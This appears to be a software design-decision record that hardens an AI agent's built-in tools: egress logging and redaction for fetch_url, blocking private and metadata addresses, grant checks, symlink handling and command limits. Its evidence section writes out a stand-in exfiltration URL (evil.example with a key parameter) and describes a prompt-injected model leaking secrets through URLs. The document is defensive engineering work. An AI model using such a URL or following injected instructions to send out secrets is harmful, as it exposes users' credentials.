# Delta — what the built-in tools do at their edges

| Field | Value |
|---|---|
| **Status** | `PROPOSED 2026-09-27 — pending the Tech Lead's ratification. T-F1-09 implements it and is merged with it open, at the user's instruction to carry on through T-F1-10.` |
| **Date** | 2026-09-27 |
| **Task** | T-F1-09 (decisions 1–5); T-F1-10 (decisions 6–10) |
| **Raised by** | Implementing T-F1-09 against Art. 4, Art. 5, REQ-AGT-018 and Tech §5.3 |

## Evidence

1. **Art. 4:** "Every request that leaves the machine SHALL go through secret redaction and
   SHALL be recorded in `egress_log`." `fetch_url` sends requests that leave the machine, but
   REQ-SEC-002 and `egress_log` speak only of providers, and REQ-AGT-018 says nothing about
   either. A URL is also the easiest way for a prompt-injected model to exfiltrate a secret
   (`https://evil.example/?k=<key>`).
2. **REQ-AGT-018** refuses *redirects* whose target resolves to a private range. It is silent on
   the first request, although `http://169.254.169.254/` needs no redirect at all.
3. **AGENTS.md:** "never run WriteFS/Exec/Network tools outside `security.Decide()`" is a rule
   for people; nothing in the specs says where it is enforced.
4. **Tech §5.3:** "Resolving symlinks is the caller's (the tool, T-F1-09)", with no rule for a
   path that does not exist yet, or for a write root reached through a link (macOS's `/tmp`).
5. **No spec bounds a tool's output**, while a model's context is finite and `grep` over a large
   tree is unbounded.

## Decisions

1. **`fetch_url` is egress under Art. 4.** A URL that the redaction rules would change carries a
   secret and is refused before anything is sent, as written or with its percent-encoding
   undone, and so is a URL whose encoding cannot be undone, since the rules could not read it;
   an encoding the rules cannot see through (base64) still passes, so this closes the
   easy channel, not every one. Every request, each redirect hop included,
   is recorded in `egress_log` before it is sent, with the thread, `provider = 'fetch_url'`,
   the host, and as payload the request URL (its length and SHA-256), since a GET carries
   nothing else. A row that cannot be written stops the request, as for model calls (DD-008),
   and without a log or the rules the tool sends nothing.
2. **`fetch_url` connects to no private address, redirected or not.** The check runs at dial
   time on the resolved address, so neither a redirect nor a name that resolves to one gets
   through: loopback, RFC 1918 and `fc00::/7`, link-local (the cloud metadata address
   included), `100.64.0.0/10`, `0.0.0.0/8`, `198.18.0.0/15`, `240.0.0.0/4` with the broadcast
   address, unspecified and multicast; IPv4-mapped IPv6 and NAT64 (`64:ff9b::/96`) judged by
   their IPv4 address, the deprecated IPv4-compatible form (`::/96`) refused. The host's own
   public addresses are not refused. No proxy is used, since a proxy would hide the address. At most five
   redirects, each `http` or `https`. A body that is not text is described, not returned.
3. **The registry runs a call only under the grant decided on its own action.** A grant carries
   the action it was decided on; `Invoke` computes the call's action again — its target resolved
   again — and refuses the call unless it is that one and the decision is an `allow` or an
   approved `ask`. A grant cannot be carried to another call, and a target that moved while the
   user read the approval (a symlink swapped in) is refused. The risk decided on is the one the
   tool registered with, whatever its `Action` reports. A call whose working directory or write
   root is not absolute is refused before it is decided on. The limit: a tool's `Run` is a Go
   method, so code in the daemon could call it without the registry; the composition root wires
   only the registry into the agent runtime (T-F1-13).
4. **Targets are resolved through symlinks** before the policy sees them: through the nearest
   existing ancestor for a path that does not exist yet, and the cwd and the write root the
   same way. A link inside the root that points out of it yields a target out of it. **A write
   goes to that resolved target**: a path that is a link writes the file it points to, which is
   what the policy decided on and the diff shows, and the link stays. The registry hands the
   tool the target it checked the grant against, and the write goes there without resolving
   anything again: it runs in an `os.Root` opened on that target's nearest existing directory,
   fails if a component or the target itself has become a link since the check, and goes
   through a temporary file renamed over the target. A dangling link resolves to its own path,
   so the policy may allow it; the write then refuses it, at run time rather than at approval.
5. **Input and output are bounded:** the file tools read only regular files of at most 16 MiB,
   opened without blocking, so a device (`/dev/zero`), a FIFO or a huge file can neither exhaust
   the daemon's memory nor hang the call; `read_file` returns at most 256 KiB (and says where it stopped),
   `grep` at most 500 matches of at most 300 characters each, reading at most 4 MiB of a file
   and saying where it stopped when a line is too long, `glob` and `list_dir` at most
   1000 entries; searches skip `.git`, binary files and files over 4 MiB.

6. **A thread's PTY is made on first use** (T-F1-10, REQ-AGT-003): the first `run_command`
   of a thread creates a session in the thread's cwd with shell integration, the thread as
   `owner_thread_id` and the agent holding its input; every later command of the thread types
   into that same shell, so the shell's state — its working directory above all — carries over
   between commands, as it does for a person. Finding or creating the PTY is serialised, so a
   thread's first two commands started together share one. A command is one line: the shell
   starts one block per line and only the first would be waited for. One command runs at a
   time per thread. The action the policy and an approval see carries the thread's cwd, not the
   shell's current one after a `cd`; for Exec the policy decides on the command line, so no
   verdict changes, but what a person reads can differ. A thread whose shell settled on
   `integration: none` keeps failing until its PTY is closed; the thread PTY's lifecycle (closing
   it when the thread ends) is T-F1-13's.
7. **A command is its block.** Its block is marked when it opens (origin `agent`, the thread),
   and `run_command` returns when that block closes, with the exit code and the tail of the
   plain output (the last 64 KiB). A thread shell that never proves its integration fails the
   call rather than running blind.
8. **A command's time is bounded**: 120 s unless the call asks for 1 to 600; past it the command
   is stopped and the model is told, with what it printed so far.
9. **Cancelling stops what the command launched and keeps the shell** (REQ-AGT-007), refining
   Tech §3 step 3 ("the thread PTY's process group gets SIGTERM; after 300 ms, SIGKILL"): the
   signals go to the process group of every child of the shell — the foreground command and
   any background job alike — rather than to the shell's own group, which would end the
   thread's PTY; SIGTERM first, SIGKILL 300 ms later, and the shell gets SIGINT with the SIGTERM,
   which ends a loop of builtins. The call returns within 500 ms. A run whose block has not
   closed by then stays on the PTY, abandoned, until its block closes or the shell prompts
   again, so a late block is never taken for the next command's; the next command waits up to
   2 s for it. A process that left the shell's children (a daemon that double-forked out of
   its group) is not found, and a shell already reaped is not signalled. `thread.cancel` itself
   is T-F1-13's and T-F1-16's.
10. **A command's result does not wait on its row** (Analyze C-01 for this path): when the
   block's row cannot be written or closed, `run_command` still returns the exit code and the
   output — the command ran — and marks the result not persisted, so the caller does not store
   a `block_id` that names no row.

## Impact

- Data Model §2.12: `egress_log.provider` holds a provider id or the tool `fetch_url`. No DDL
  change: the column is free text.
- Tech §5.3b (new) states decisions 1–10, and §3 step 3 points at decision 9.
- Tech §5.2: `tools/adapters` may import `sessions/ports`, for `AgentTerminal` alone, which
  `cmd/umbrald` wires (`.go-arch-lint.yml` has allowed it since the scaffold; this is its first
  use).
- `session.list`/`session.get` now return `owner_thread_id` for a thread's PTY, which the API
  already declared and the store never read back.
- REQ-AGT-018 could gain "and to such ranges directly", and REQ-SEC-002 "or a tool", if the
  Tech Lead wants the PRD to say it outright.
